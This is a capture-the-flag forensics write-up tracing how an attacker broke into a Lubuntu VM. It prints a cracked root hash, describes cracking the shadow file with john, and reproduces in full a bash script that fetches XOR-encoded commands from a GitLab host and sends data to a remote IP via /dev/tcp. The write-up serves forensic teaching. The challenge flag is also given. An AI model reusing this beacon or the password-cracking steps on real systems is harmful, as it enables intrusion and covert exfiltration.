# Challenge Name: DFIR

![date](https://img.shields.io/badge/date-24.04.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![forensics category](https://img.shields.io/badge/category-Forensics-blueviolet.svg)   
![value](https://img.shields.io/badge/value-400-blue.svg)  


## Description

Our Lubuntu server has been breached! We recieved an alert about it communicating with malicious servers and we saw a SIGNIFICANT increase in CPU usage. We SSHed in and saw that changes had been made to the / directory. We need to know how this attacker got in (so we can keep him out in the future) and what he was using our server for...

uname: "victem" (ya, we kinda jinxed ourselves with that name) pw: "correct-horse-battery-staple"

Download: https://drive.google.com/file/d/16sV8pXSrG22KL4zJ9VrpZTcZAs_N9XYw/view 

## Detailed solution  

Start by importing the virtualbox machine and run it 

![image](https://user-images.githubusercontent.com/72421091/116092049-fde5d280-a694-11eb-93e7-3d1c3011ebac.png)

Let's SSH to the machine using the credentials in description ```victem / correct-horse-battery-staple``` get more confortable 

Our machine is a ```Lubuntu 18.04 LTS``` and the linux kernel version is ```4.15.0-20``` 

![image](https://user-images.githubusercontent.com/72421091/116094116-ca0bac80-a696-11eb-985f-8ee3b03d722e.png)

The description mention that that changes had been made to the / directory so let's go check it 

![image](https://user-images.githubusercontent.com/72421091/116096118-89149780-a698-11eb-9b94-39c013a822ee.png)

The file ```cluster-crack.pot``` is suspicious let's read it  

```
cat cluster-crack.pot

$6$fZ/iAgR.$FHl9m/ibTVBQ3OQ645IiLtrcxSsxdt8pTQHh7knfQ2GhD7Pbu0Dv0evXaGnnMVjV7xe5KlRprL5hWEjE6/Ruj0:toor
```

We can see a decrypted linux hash password which is ```toor``` which is a commun default root password 

The POT file is where john stores passwords that it has already cracked for display with the "--show" command  

So the attacker used john the decrypt the users hash password 

Checking the passwd file we can see the users root and victem 

![image](https://user-images.githubusercontent.com/72421091/116098680-caa64200-a69a-11eb-835c-9be03c5a1c45.png)

Let's switch to ```root``` with the password ```toor``` and check the bash history 

![image](https://user-images.githubusercontent.com/72421091/116099769-d2b2b180-a69b-11eb-9ff3-ac36623743b5.png)  

NB : the line 6 is wrong it's sould be ```wget https://gitlab.com/thehacker1/payload/-/blob/master/.payload.sh```  

![image](https://user-images.githubusercontent.com/72421091/116101630-82d4ea00-a69d-11eb-9d94-b4d6f74c5c25.png)

We can see two attacks, running a payload.sh and cracking the shadow file hashes using john and the wordlist rockyou.txt

The files has been downloaded from a gitlab repository https://gitlab.com/thehacker1/payload/-/tree/master 

![image](https://user-images.githubusercontent.com/72421091/116103519-312d5f00-a69f-11eb-997f-9c19f201bccd.png)

payload.sh file 

```bash
#!/bin/bash

W=$((15*60))
K=120

while true
do
	echo "sleeping for $W seconds"
	sleep $W
	rm .encrypted_csv.data
	wget https://gitlab.com/thehacker1/payload/-/raw/master/.encrypted_csv.data
	echo "downloaded file"
	F="./.encrypted_csv.data"
	hexdump -v -e '/1 "%u\n"' $F | while read B; do
		E=$((K^B))
		C=$(printf \\$(printf '%03o' $E))
		echo -n $C >> encrypted.csv
	done
	echo "decrypted newest command"
	S=$(cat encrypted.csv)
	rm encrypted.csv
	S="${S::-1}"
	D=,
	S=$S$D
	array=();
	while [[ $S ]]; do
		array+=( "${S%%"$D"*}" );
		S=${S#*"$D"};
	done;
	declare -a array
	M=${array[0]}
	I=${array[1]}
	P=${array[2]}
	M=${M##WPI}
	echo "routing message to $I:$P"
	echo "$M" > /dev/tcp/$I/$P
done
```

We can see some steps :

- Download the .encrypted_csv.data file from the gitlab repository using wget
- Decrypting the file : convert .encrypted_csv.data to decimal values, xor using K=120, converto to octal values and print the ascii charactere
- 




## Flag

```
WPI{1n53cUR3_5tud3Nts}
```
